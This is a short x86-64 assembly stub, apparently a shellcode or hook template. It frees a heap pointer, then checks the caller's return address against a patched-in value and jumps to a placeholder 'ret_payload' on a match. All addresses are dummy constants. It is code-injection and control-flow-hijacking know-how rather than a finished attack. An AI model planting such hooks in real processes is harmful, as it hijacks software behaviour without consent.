[bits 64]

test rcx, rcx
jz skip_free

; prologue
push rbx
mov rbx, rcx
sub rsp, 32

call QWORD [rel GetProcessHeap]

mov rcx, rax
xor rdx, rdx
mov r8, rbx
call QWORD [rel HeapFree]

; epilogue
add rsp, 32
pop rbx

skip_free:
mov rcx, QWORD [rsp]

; cancer
mov rdx, rcx
and rdx, 0xfff
cmp rdx, 0xff8
jg done

mov rcx, [rcx]
mov rdx, QWORD [rel match_ret]

cmp rcx, rdx
je ret_payload

done:
ret

align 0x80

GetProcessHeap:
    dq   0x11223344556677

HeapFree:
    dq   0x11223344556677

match_ret:
    dq   0x11223344556677

ret_payload:
    dq   0x11223344556677


